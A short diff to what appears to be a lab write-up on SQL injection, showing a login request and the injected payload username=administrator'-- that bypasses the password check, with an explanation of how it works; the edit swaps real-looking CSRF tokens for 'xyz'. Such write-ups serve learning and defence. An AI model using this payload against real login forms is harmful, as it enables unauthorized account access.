@@ -17,14 +17,15 @@ Password: password
 ```http
 POST /login HTTP/2
 ...
-csrf=jlp1tF4FYmhhmdJpIEGytS4FmMLNudbB&username=user&password=password
+csrf=xyz&username=user&password=password
 ```
 
 ### 3. Modify the username and password parameter to inject SQL
 **Injected Payload:**
 
-`csrf=lJFu1mCFnL7NMOgl664WX9YL1NddLmCW&username=administrator'--&password=''`
-
+```http
+`csrf=xyz&username=administrator'--&password=''`
+```
 ### 4. Explanation
 
 `username=administrator` attempts to log in as administrator, `'` closes the string in the SQL query. `--` comments out the rest of the query and bypasses the password check.
